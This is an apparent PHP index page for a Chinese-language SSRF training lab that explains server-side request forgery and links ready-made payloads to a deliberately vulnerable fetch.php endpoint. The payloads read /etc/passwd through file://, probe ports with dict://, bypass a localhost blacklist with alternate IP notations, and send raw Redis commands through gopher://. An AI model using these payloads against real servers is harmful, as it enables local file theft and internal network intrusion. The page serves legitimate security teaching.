<?php
// gopher：向本机 Redis 发送 RESP 的 PING（路径中 _ 后为原始 TCP 载荷，需 URL 编码）
$gopherRedisPing = 'gopher://127.0.0.1:6379/_*1%0d%0a%244%0d%0aPING%0d%0a';

$sections = [
    '一、file:// 读文件' => [
        'file:///flag'              => '读取容器内 FLAG 文件',
        'file:///etc/passwd'        => '读系统文件（视权限）',
    ],
    '二、dict:// 探测内网端口' => [
        'dict://127.0.0.1:6379/show' => '本机已开 Redis 时通常有回显（可对比 closed 端口）',
        'dict://127.0.0.1:80/show'   => '对 Web 端口发 dict，回显与错误信息与关闭端口不同，可用于「扫端口」对比',
        'dict://127.0.0.1:9998/show' => '无服务监听时多为连接失败（见 fetch 返回的 curl errno）',
    ],
    '三、127.0.0.1 绕过（访问 /secret.php）' => [
        'http://127.1/secret.php'           => '省略写法的环回地址',
        'http://2130706433/secret.php'      => '十进制 IP（127.0.0.1）',
        'http://0x7f.0x00.0x00.0x01/secret.php' => '十六进制分段（视 libcurl 是否接受）',
        'http://0177.0.0.1/secret.php'      => '八进制 0177 = 127',
    ],
    '四、gopher:// 打内网服务（Redis RESP）' => [
        $gopherRedisPing => '经 gopher 向 6379 发 PING，成功时常见 +PONG（依赖 libcurl 与 Redis）',
    ],
];
?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SSRF 演示靶场</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; background: #f4f5f7; color: #1f2937; font-size: 14px; }
        .wrap { max-width: 1180px; margin: 20px auto; padding: 0 16px; }
        .split { display: grid; grid-template-columns: 1fr 400px; gap: 16px; align-items: start; }
        @media (max-width: 900px) { .split { grid-template-columns: 1fr; } .panel-right { position: static !important; } }
        .card { background: #fff; border-radius: 10px; padding: 18px 20px; box-shadow: 0 4px 12px rgba(0,0,0,.08); margin-bottom: 14px; }
        .panel-right { position: sticky; top: 14px; }
        h1 { margin: 0 0 10px; font-size: 1.35rem; }
        h2 { margin: 16px 0 8px; font-size: 1.05rem; color: #111827; }
        h2:first-child { margin-top: 0; }
        p, li { line-height: 1.55; margin: 6px 0; }
        .muted { color: #6b7280; font-size: 13px; }
        code { background: #eef2ff; padding: 2px 6px; border-radius: 4px; font-size: 12px; word-break: break-all; }
        pre { background: #111827; color: #e5e7eb; padding: 12px; border-radius: 8px; overflow: auto; font-size: 11px; line-height: 1.4; }
        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 8px; font-family: Consolas, monospace; font-size: 12px; }
        button { margin-top: 10px; padding: 10px 16px; border: none; border-radius: 8px; background: #2563eb; color: #fff; cursor: pointer; font-size: 14px; }
        .ex { margin: 10px 0; padding-bottom: 10px; border-bottom: 1px solid #f3f4f6; }
        .ex:last-child { border-bottom: none; }
        a.link { color: #2563eb; word-break: break-all; font-size: 12px; }
        .warn { background: #fef3c7; border: 1px solid #fcd34d; color: #92400e; padding: 10px 12px; border-radius: 8px; font-size: 13px; margin-top: 10px; }
        ul { margin: 6px 0 6px 1.1em; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>SSRF（服务端请求伪造）演示靶场</h1>
        <p class="muted">服务端将用户传入的 URL 交给 <strong>cURL</strong> 发起请求（支持 <code>file://</code>、<code>http(s)://</code>、<code>dict://</code>、<code>gopher://</code> 等，以 libcurl 为准），<strong>未校验协议与目标</strong>。</p>
        <p class="muted">容器内已启动 <strong>Redis（127.0.0.1:6379）</strong>，便于对比 dict/gopher 与「关闭端口」的差异。</p>
        <p class="warn">漏洞接口：<code>fetch.php?url=</code>。仅用于授权环境。</p>
    </div>

    <div class="split">
        <div class="panel-left">
            <div class="card">
                <h2>原理简述</h2>
                <p>利用服务端代为发起请求，可读内网与本地文件、用 <code>dict</code> 做端口探测、用 <code>gopher</code> 构造 TCP 载荷（如 Redis、FastCGI 等场景）。</p>
                <ul>
                    <li><strong>file</strong>：读本地文件。</li>
                    <li><strong>dict</strong>：连接目标主机端口并发送 dict 协议数据，根据错误/回显判断端口状态（常作「扫内网」）。</li>
                    <li><strong>127 绕过</strong>：黑名单拦 <code>127.0.0.1</code> 时，可用十进制 IP、八进制、十六进制分段、<code>127.1</code> 等形式（取决于解析组件）。</li>
                    <li><strong>gopher</strong>：在 URL 中携带原始字节流，对内网服务发自定义协议（如 Redis RESP）。</li>
                </ul>
            </div>

            <div class="card">
                <h2>本靶场内置</h2>
                <ul>
                    <li><code>/secret.php</code>：仅本机 <code>REMOTE_ADDR</code> 可访问；可配合 127 的各种写法测试绕过。</li>
                    <li><code>/flag</code>：<code>file:///flag</code> 可读。</li>
                    <li><code>127.0.0.1:6379</code>：Redis，供 dict/gopher 演示。</li>
                </ul>
            </div>

            <?php foreach ($sections as $secTitle => $items): ?>
            <div class="card">
                <h2><?php echo htmlspecialchars($secTitle); ?></h2>
                <?php foreach ($items as $u => $desc): ?>
                    <div class="ex">
                        <div class="muted"><?php echo htmlspecialchars($desc); ?></div>
                        <a class="link" href="/fetch.php?url=<?php echo rawurlencode($u); ?>" target="_blank" rel="noopener">fetch.php?url=<?php echo htmlspecialchars($u, ENT_QUOTES, 'UTF-8'); ?></a>
                    </div>
                <?php endforeach; ?>
            </div>
            <?php endforeach; ?>

            <div class="card">
                <h2>对比：浏览器直连敏感页</h2>
                <p class="muted">打开 <a href="/secret.php" target="_blank">/secret.php</a> 一般为 403；通过 SSRF 使用上述 127 绕过 URL 应由服务端代为访问成功。</p>
            </div>
        </div>

        <div class="panel-right">
            <div class="card">
                <h2 style="margin-top:0;">自定义 url</h2>
                <p class="muted">由服务端 <code>curl_exec</code> 执行（见 <code>fetch.php</code>）。</p>
                <form method="get" action="/fetch.php" target="_blank">
                    <label class="muted" for="u">url</label>
                    <input id="u" type="text" name="url" placeholder="dict://127.0.0.1:6379/show" value="http://127.0.0.1/secret.php">
                    <button type="submit">执行</button>
                </form>
                <p class="muted" style="margin-top:12px;">结果在新标签页纯文本展示；失败时会打印 <code>curl errno</code>，便于对比端口开放情况。</p>
            </div>
        </div>
    </div>
</div>
</body>
</html>
